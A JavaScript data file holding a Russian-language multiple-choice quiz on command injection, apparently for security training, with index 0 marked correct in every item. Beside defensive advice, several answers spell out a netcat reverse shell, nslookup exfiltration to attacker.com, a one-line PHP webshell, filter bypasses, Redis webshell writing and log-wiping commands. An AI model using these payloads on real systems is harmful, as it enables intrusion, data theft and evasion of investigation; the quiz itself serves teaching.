export const quizQuestions = [
    {
        question: "Что такое Command Injection?",
        answers: [
            "Уязвимость, позволяющая выполнение произвольных команд операционной системы на сервере",
            "Внедрение команд SQL",
            "Внедрение команд JavaScript",
            "Внедрение команд CSS"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Чем Command Injection отличается от Code Injection?",
        answers: [
            "Command Injection выполняет команды ОС (ls, ping), а Code Injection выполняет код языка программирования (PHP, Python) внутри приложения",
            "Ничем",
            "Command Injection безопаснее",
            "Code Injection это только для Java"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой символ используется для последовательного выполнения команд в Linux (игнорируя ошибки)?",
        answers: [
            ";",
            "&",
            "&&",
            "|"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой символ используется для выполнения команды в фоне в Linux?",
        answers: [
            "&",
            ";",
            "|",
            "$"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что делает оператор `|` (pipe)?",
        answers: [
            "Передает вывод первой команды на вход второй",
            "Останавливает команду",
            "Удаляет файл",
            "Копирует файл"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Blind Command Injection'?",
        answers: [
            "Когда результат выполнения команды не выводится в ответе HTTP, но команда выполняется",
            "Когда команда не выполняется",
            "Когда команда невидима",
            "Когда сервер выключен"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как детектировать Blind Command Injection?",
        answers: [
            "Используя Time-based payloads (sleep, ping) или OOB (DNS/HTTP запросы наружу)",
            "Посмотреть логи",
            "Спросить админа",
            "Угадать"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какая команда вызывает задержку в Linux?",
        answers: [
            "sleep 10",
            "wait 10",
            "delay 10",
            "pause 10"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какая команда вызывает задержку в Windows?",
        answers: [
            "timeout /t 10 или ping -n 11 127.0.0.1",
            "sleep 10",
            "wait 10",
            "delay 10"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Reverse Shell'?",
        answers: [
            "Оболочка (shell), которая инициирует соединение от сервера к атакующему (обход входящего Firewall)",
            "Оболочка наоборот",
            "Защищенная оболочка",
            "Оболочка администратора"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Bind Shell'?",
        answers: [
            "Оболочка, которая открывает порт на сервере и ждет подключения от атакующего",
            "Оболочка в книге",
            "Оболочка для слепых",
            "Оболочка для глухих"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой инструмент часто используется для создания listener (слушателя) при Reverse Shell?",
        answers: [
            "Netcat (nc)",
            "Notepad",
            "Calc",
            "Paint"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как выглядит простейшая команда для чтения файла паролей в Linux?",
        answers: [
            "cat /etc/passwd",
            "read passwords",
            "show users",
            "get root"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какая функция в PHP опасна и может привести к Command Injection?",
        answers: [
            "system(), exec(), passthru(), shell_exec()",
            "echo()",
            "print()",
            "mysql_connect()"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как в Python безопасно вызывать команды ОС?",
        answers: [
            "Использовать модуль `subprocess` с `shell=False` и передавать аргументы списком",
            "os.system()",
            "popen()",
            "commands.getoutput()"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли обойти фильтр пробелов в Command Injection (Linux)?",
        answers: [
            "Да, используя ${IFS}, <, или табуляцию",
            "Нет, пробел обязателен",
            "Только в Windows",
            "Только в Mac"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `${IFS}`?",
        answers: [
            "Внутренняя переменная разделителя полей в Shell (обычно пробел, таб, новая строка). Используется как замена пробелам",
            "Файловая система",
            "Интернет сервис",
            "Протокол"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как объединить команды, если `;` и `&` заблокированы (Linux)?",
        answers: [
            "Использовать перевод строки (%0a) или подстановку команд через `command` или $(command)",
            "Нельзя",
            "Сдаться",
            "Использовать мышь"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли использовать `Backticks` (обратные кавычки) для инъекции?",
        answers: [
            "Да, `command` выполняет команду и подставляет результат. `echo `ls`` покажет список файлов",
            "Нет",
            "Только в SQL",
            "Только в HTML"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой инструмент автоматизированного поиска Command Injection существует?",
        answers: [
            "Commix",
            "Sqlmap",
            "Nmap",
            "Wireshark"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Почему функция `escapeshellarg()` в PHP важна?",
        answers: [
            "Она экранирует аргумент (добавляет кавычки и экранирует внутри), делая его безопасным для передачи в команду",
            "Она удаляет аргумент",
            "Она выполняет аргумент",
            "Она шифрует аргумент"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Argument Injection'?",
        answers: [
            "Когда нельзя выполнить новую команду, но можно добавить новые аргументы к существующей (например, в tar или find)",
            "Инъекция спора",
            "Инъекция фактов",
            "Инъекция логики"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как через `find` можно выполнить команду?",
        answers: [
            "Используя аргумент `-exec command \;`",
            "find / -name shell",
            "find execute",
            "find run"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как через `tar` можно выполнить команду (Wildcard Injection)?",
        answers: [
            "Если есть файлы с именами-флагами (например, --checkpoint-action=exec=sh), и используется `tar *`",
            "tar -xvf shell",
            "tar create",
            "tar run"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что возвращает `whoami`?",
        answers: [
            "Имя текущего пользователя, под которым работает процесс",
            "IP адрес",
            "Имя компьютера",
            "Версию ОС"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что возвращает `id`?",
        answers: [
            "Информацию о пользователе и группах (uid, gid)",
            "ID сессии",
            "ID товара",
            "ID страницы"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как прочитать файл, если `cat` заблокирован?",
        answers: [
            "more, less, head, tail, vi, grep, awk, sed, rev, tac",
            "Никак",
            "Только mouse",
            "Только dog"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что делает `nc -e /bin/sh LHOST LPORT`?",
        answers: [
            "Запускает Reverse Shell (если версия nc поддерживает -e)",
            "Сканирует порты",
            "Читает почту",
            "Открывает браузер"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как получить Reverse Shell без `-e` в netcat?",
        answers: [
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
            "Нельзя",
            "Купить новую версию",
            "Использовать telnet"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какая уязвимость CVE-2014-6271 известна как?",
        answers: [
            "Shellshock (уязвимость в Bash при парсинге переменных окружения)",
            "Heartbleed",
            "Poodle",
            "Spectre"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли получить Command Injection через имя файла при загрузке?",
        answers: [
            "Да, если имя файла подставляется в команду обработки (например, ImageMagick convert)",
            "Нет",
            "Только в Windows",
            "Только в Mac"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `ImageTragick`?",
        answers: [
            "Серия уязвимостей в ImageMagick, позволяющая RCE при обработке картинок",
            "Магия имиджа",
            "Фотошоп",
            "Вирус"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как в Windows выполнить несколько команд?",
        answers: [
            "& (cmd1 & cmd2) или && (cmd1 && cmd2 - если первая успешна) или || (если первая упала)",
            "Только ;",
            "Только Newline",
            "Нельзя"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Работает ли `ls` в Windows?",
        answers: [
            "В PowerShell да (алиас), в cmd.exe нет (нужно `dir`)",
            "Да",
            "Нет",
            "Только в Win10"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `nslookup`?",
        answers: [
            "Утилита для DNS запросов. Часто используется для OOB (Out-of-Band) эксфильтрации",
            "Поиск файлов",
            "Поиск людей",
            "Браузер"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как передать данные через OOB DNS?",
        answers: [
            "nslookup `whoami`.attacker.com (данные становятся поддоменом, и приходят на DNS сервер атакующего)",
            "nslookup data",
            "nslookup attacker.com",
            "ping attacker.com"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Polyglot' command injection payload?",
        answers: [
            "Пейлоад, который работает и закрывает контексты в разных языках/оболочках сразу",
            "Много команд",
            "Сложная команда",
            "Длинная команда"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "В чем опасность запуска веб-сервера от root?",
        answers: [
            "При Command Injection (RCE) атакующий сразу получает полные права над системой",
            "Нет опасности",
            "Сервер работает быстрее",
            "Это стандарт"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как ограничить права веб-приложения?",
        answers: [
            "Запускать от отдельного пользователя (www-data), использовать chroot, контейнеры, SELinux/AppArmor",
            "Запускать от root",
            "Удалить пользователей",
            "Отключить пароль"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `curl` pipe to bash?",
        answers: [
            "curl https://... | bash. Опасная практика установки софта, но и вектор атаки если URL контролируется",
            "Скачивание файла",
            "Просмотр сайта",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли использовать `wget` для RCE?",
        answers: [
            "Да, можно загрузить Webshell в публичную директорию",
            "Нет",
            "Только для скачивания",
            "Только для чтения"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `awk` injection?",
        answers: [
            "Если данные пользователя попадают в скрипт awk, можно использовать `system()` функцию awk",
            "Ошибка awk",
            "Тип файла",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как защититься на уровне WAF?",
        answers: [
            "Блокировать ключевые слова (cat, etc, passwd, system) и символы (; | ` $)",
            "Блокировать IP",
            "Блокировать GET",
            "Блокировать POST"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Является ли фильтрация хорошей защитой?",
        answers: [
            "Нет, фильтры часто можно обойти. Лучше избегать вызова системных команд архитектурно",
            "Да, идеальной",
            "Иногда",
            "Для Windows да"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какие библиотеки лучше использовать вместо system()?",
        answers: [
            "Специализированные библиотеки для задачи (например, Imagick для картинок, библиотеки архивации, SMTP клиенты)",
            "Другие exec функции",
            "Самописные скрипты",
            "Никакие"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли выполнить RCE через SQLi?",
        answers: [
            "Да, если есть права и функции типа xp_cmdshell (MSSQL) или UDF (MySQL)",
            "Нет",
            "Только в Oracle",
            "Только в Access"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Environment Variable Injection'?",
        answers: [
            "Изменение переменных окружения (LD_PRELOAD, PATH) перед запуском команды, что может привести к RCE",
            "Инъекция природы",
            "Инъекция погоды",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как защититься от атаки через PATH?",
        answers: [
            "Использовать абсолютные пути к бинарникам (/bin/ls вместо ls) и очищать environment",
            "Не использовать PATH",
            "Удалить PATH",
            "Сменить ОС"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `chroot`?",
        answers: [
            "Смена корневого каталога для процесса, ограничивающая доступ к остальной файловой системе",
            "Права доступа",
            "Смена пароля",
            "Удаление root"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли выбраться из chroot?",
        answers: [
            "Да, если процесс имеет root права (chroot breakout), защита не абсолютна без дополнительных мер",
            "Нет, никогда",
            "Только перезагрузкой",
            "Только с паролем"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `docker escape`?",
        answers: [
            "Выход из контейнера Docker на хост-систему, что при Command Injection внутри контейнера критично",
            "Побег из тюрьмы",
            "Удаление докера",
            "Остановка контейнера"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какой язык наиболее подвержен Command Injection из-за частого использования system() и backticks?",
        answers: [
            "Perl (legacy CGI скрипты) и PHP",
            "Java",
            "C#",
            "Go"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `eval()` injection?",
        answers: [
            "Выполнение произвольного кода языка (PHP, JS, Python), что по сути Code Injection, но очень близко по последствиям к Command Injection",
            "Оценка стоимости",
            "Вычисление",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как проверить уязвимость без деструктивных действий?",
        answers: [
            "Использовать команды `id`, `whoami`, `hostname` или `sleep`",
            "Использовать `rm -rf /`",
            "Использовать `reboot`",
            "Использовать `shutdown`"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `Java Runtime.exec()`?",
        answers: [
            "Метод для запуска команд в Java. Если аргументы передаются строкой без токенизации, возможна инъекция",
            "Виртуальная машина",
            "Компилятор",
            "Антивирус"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как безопасно использовать `Runtime.exec()`?",
        answers: [
            "Использовать перегрузку с массивом строк (String[] cmd), это предотвращает интерпретацию оболочкой",
            "Использовать String",
            "Использовать StringBuilder",
            "Не использовать Java"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли получить Command Injection в Node.js?",
        answers: [
            "Да, функции child_process.exec() и child_process.spawn({shell: true}) уязвимы",
            "Нет, Node.js безопасен",
            "Только в Deno",
            "Только в браузере"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "В чем разница execFile и exec в Node.js?",
        answers: [
            "execFile выполняет файл напрямую (безопаснее, если не shell), exec запускает shell (опасно)",
            "Нет разницы",
            "exec быстрее",
            "execFile для картинок"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Wildcard expansion'?",
        answers: [
            "Раскрытие * оболочкой. Может использоваться для манипуляции аргументами (см. tar checkpoint)",
            "Расширение карты",
            "Дикая карта",
            "Игра"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как избежать Wildcard Injection?",
        answers: [
            "Использовать `--` перед аргументом-именем файла, чтобы сказать утилите 'дальше только файлы'",
            "Удалить *",
            "Не использовать файлы",
            "Использовать Windows"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `sed` injection?",
        answers: [
            "Инъекция в выражение sed, позволяющая выполнить команду через флаг `e` (execute)",
            "Редактор",
            "Поток",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Может ли Command Injection быть в заголовке Host?",
        answers: [
            "Да, если сервер использует его в скриптах (например, для роутинга или логов) через system()",
            "Нет",
            "Редко",
            "Всегда"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что делает команда `cat /etc/shadow`?",
        answers: [
            "Показывает хеши паролей (нужен root). Ценная цель при Command Injection",
            "Показывает тень",
            "Показывает пользователей",
            "Показывает группы"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как сканировать внутреннюю сеть при Command Injection?",
        answers: [
            "Написать простой скрипт (for loop + ping/nc) и запустить на скомпрометированном сервере",
            "Нельзя",
            "Только через VPN",
            "Только в Windows"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `webshell`?",
        answers: [
            "Скрипт (PHP, JSP, ASP), загруженный на сервер, дающий интерфейс для выполнения команд",
            "Веб сайт",
            "Оболочка браузера",
            "Плагин"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как загрузить webshell через Command Injection?",
        answers: [
            "echo '<?php system($_GET[c]); ?>' > shell.php",
            "download shell",
            "install shell",
            "run shell"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Может ли WAF блокировать команды по длине?",
        answers: [
            "Да. Обойдти можно, записывая команду по частям в файл (echo -n 'p' >> f; ... sh f)",
            "Нет",
            "Всегда",
            "Никогда"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Fileless RCE'?",
        answers: [
            "Выполнение вредоносного кода/команд только в памяти без записи файлов на диск (усложняет форензику)",
            "RCE без файлов",
            "RCE в облаке",
            "RCE в сети"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как в Python `subprocess.run` может быть уязвим?",
        answers: [
            "Только если `shell=True` и аргументы не санитайзятся",
            "Всегда",
            "Никогда",
            "Если shell=False"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `Ruby open()` injection?",
        answers: [
            "Если имя файла начинается с `|`, Ruby открывает его как процесс (команду). open('|ls')",
            "Открытие файла",
            "Открытие двери",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `perl open()` injection?",
        answers: [
            "Аналогично Ruby, open(FH, $input) уязвим, если input содержит pipe",
            "Перл",
            "Жемчужина",
            "Нет"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как исправить уязвимость Ruby open?",
        answers: [
            "Использовать `File.open` вместо Kernel `open`",
            "Не использовать Ruby",
            "Удалить open",
            "Использовать close"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Входит ли Command Injection в OWASP Top 10?",
        answers: [
            "Да, в категорию Injection (A03)",
            "Нет",
            "Был, но убрали",
            "Только в Top 1"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое 'Command Injection via SSI' (Server Side Includes)?",
        answers: [
            "Внедрение директив SSI (<!--#exec cmd='ls' -->) в HTML страницах с расширением .shtml",
            "SSI инъекция",
            "SSL инъекция",
            "SSH инъекция"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как защитить SSI?",
        answers: [
            "Отключить exec директиву в конфигурации сервера или не использовать SSI для пользовательского ввода",
            "Включить SSI",
            "Удалить .shtml",
            "Ничего"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли получить RCE через Deserialization?",
        answers: [
            "Да, часто гаджет-чейны заканчиваются выполнением команд (Runtime.exec и т.д.)",
            "Нет",
            "Только в Java",
            "Только в PHP"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Какая основная причина Command Injection?",
        answers: [
            "Доверие пользовательскому вводу и его передача в системный шелл",
            "Плохой код",
            "Старый сервер",
            "Хакеры"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Помогает ли 'least privilege' против Command Injection?",
        answers: [
            "Да, ограничивает ущерб (нельзя прочитать shadow, нельзя писать в системные папки), но не устраняет уязвимость",
            "Да, полностью защищает",
            "Нет",
            "Немного"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Можно ли использовать `dd` для записи файла?",
        answers: [
            "Да, dd if=... of=... (полезно, если redirection > фильтруется)",
            "Нет",
            "Только для дисков",
            "Только для бэкапа"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `base64` в контексте эксплуатации?",
        answers: [
            "Способ передать бинарные данные или сложные команды, избегая спецсимволов. echo BASE64 | base64 -d | sh",
            "Шифр",
            "Кодировка",
            "Хеш"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как проверить, есть ли у нас права на запись в текущую директорию?",
        answers: [
            "touch test или echo test > test",
            "ls -la",
            "pwd",
            "cd"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что будет, если выполнить `rm -rf /` без --no-preserve-root?",
        answers: [
            "Современные системы обычно защищают от этого, требуя флага",
            "Удалит всё",
            "Ничего",
            "Перезагрузка"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как скрыть свои следы (логи) после RCE?",
        answers: [
            "Очистить .bash_history, логи /var/log (требует прав), unset HISTFILE",
            "Удалить монитор",
            "Выключить свет",
            "Убежать"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое Log Poisoning (отравление логов) для RCE?",
        answers: [
            "Внедрение PHP кода в User-Agent или другие заголовки, которые пишутся в лог (apache/nginx), а затем чтение этого лога через LFI (Local File Inclusion), что приводит к выполнению кода",
            "Удаление логов",
            "Шифрование логов",
            "Чтение логов"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Чем `ProcessBuilder` в Java лучше `Runtime.exec`?",
        answers: [
            "Он спроектирован для безопасного управления процессами, принимает список аргументов, разделяя команду и данные, что затрудняет инъекцию",
            "Он быстрее",
            "Он новее",
            "Он красивее"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как выполнить команду в PHP, если все функции exec отключены в php.ini?",
        answers: [
            "Через уязвимости (например, putenv + mail/imap_open для LD_PRELOAD bypass), или если разрешен `pcntl_exec`",
            "Нельзя",
            "Включить обратно",
            "Использовать Java"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `LD_PRELOAD` атака?",
        answers: [
            "Загрузка вредоносной библиотеки перед запуском программы. Позволяет перехватывать системные вызовы и выполнять код",
            "Предзагрузка картинок",
            "Загрузка сайта",
            "Нет такого"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Может ли загрузка файла привести к Command Injection?",
        answers: [
            "Да, если имя файла не санитайзится и используется в скрипте обработки (например, mv $filename /tmp/)",
            "Нет",
            "Только если файл exe",
            "Только если файл php"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `Gitlist` RCE vulnerability?",
        answers: [
            "Известная уязвимость в Gitlist, связанная с недостаточной санитизацией при вызове git команд (Argument Injection)",
            "Уязвимость списка",
            "Уязвимость GitHub",
            "Нет такой"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Используется ли Command Injection в вирусах-червях?",
        answers: [
            "Да, многие черви (например, Mirai для IoT) используют Command Injection в роутерах для распространения",
            "Нет",
            "Редко",
            "Только в троянах"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `Gopher` протокол?",
        answers: [
            "Устаревший протокол. При SSRF позволяет отправлять任意ые данные (в том числе для RCE в Redis, FastCGI)",
            "Суслик",
            "Животное",
            "Протокол Google"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как получить RCE через Redis (без аутентификации)?",
        answers: [
            "Через команду CONFIG SET dir /var/www/html и dbfilename shell.php, затем SAVE (запись веб-шелла)",
            "Через GET key",
            "Через SET key value",
            "Через PING"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Является ли `tar` безопасным для распаковки?",
        answers: [
            "Не всегда. Zip Slip (перезапись произвольных файлов) и Wildcard Injection могут привести к RCE",
            "Да, абсолютно",
            "Только в Linux",
            "Только gtar"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `Zip Slip`?",
        answers: [
            "Уязвимость при распаковке архива, содержащего файлы с путями типа `../../shell.php`, позволяющая писать за пределы целевой папки",
            "Скользкий архив",
            "Сжатие ZIP",
            "Пароль на ZIP"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Как защититься от Zip Slip?",
        answers: [
            "Проверять канонический путь каждого распаковываемого файла (должен начинаться с целевой директории)",
            "Не использовать ZIP",
            "Использовать 7zip",
            "Использовать RAR"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `XXE to RCE`?",
        answers: [
            "Иногда (редко) XXE позволяет выполнить RCE, например, если PHP модуль expect установлен (expect://id)",
            "Всегда RCE",
            "Никогда",
            "Только в Java"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Может ли `Serialization` привести к Command Injection?",
        answers: [
            "Да (Insecure Deserialization), если десериализуется класс, который в деструкторе или wakeup вызывает exec",
            "Нет",
            "Только JSON",
            "Только XML"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Что такое `YSOSERIAL`?",
        answers: [
            "Инструмент для генерации payloads для эксплуатации Java Deserialization (часто RCE)",
            "Сериал",
            "Программа ТВ",
            "Еда"
        ],
        correctAnswerIndex: 0
    },
    {
        question: "Почему важно обновлять зависимости (Libraries)?",
        answers: [
            "Потому что CVE (включая RCE) часто находят в библиотеках (Struts, Spring, ImageMagick, log4j)",
            "Чтобы было красиво",
            "Для новых функций",
            "Просто так"
        ],
        correctAnswerIndex: 0
    }
];
